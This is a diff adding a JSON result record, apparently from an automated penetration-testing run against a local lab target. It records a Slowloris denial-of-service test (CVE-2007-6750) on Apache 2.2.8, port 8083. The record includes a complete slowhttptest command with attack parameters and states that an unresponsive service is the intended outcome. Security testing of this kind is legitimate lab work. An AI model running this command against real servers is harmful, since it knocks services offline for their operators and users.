@@ -1,0 +1,14 @@
+{
+  "timestamp": "2026-04-12T07:40:36.372625",
+  "target": "localhost",
+  "vulnerability": "Apache 2.2.8 Slowloris Denial of Service",
+  "tool": "manual",
+  "module": "CVE-2007-6750 Slowloris DoS",
+  "result": {
+    "success": null,
+    "output": "[MANUAL TESTING REQUIRED]\n\nVulnerability: Apache 2.2.8 Slowloris Denial of Service\nPort: 8083\n\nSteps:\nslowhttptest -c 1000 -H -g -o my_slowloris_report -i 10 -r 200 -x 10 -p 3 -u http://localhost:8083/\n\nExpected outcome: Apache httpd service on port 8083 becomes unresponsive, causing denial of service\n\nFallback: N/A (DoS is the intended outcome for this vulnerability)",
+    "tool": "manual",
+    "vulnerability": "Apache 2.2.8 Slowloris Denial of Service",
+    "port": 8083
+  }
+}
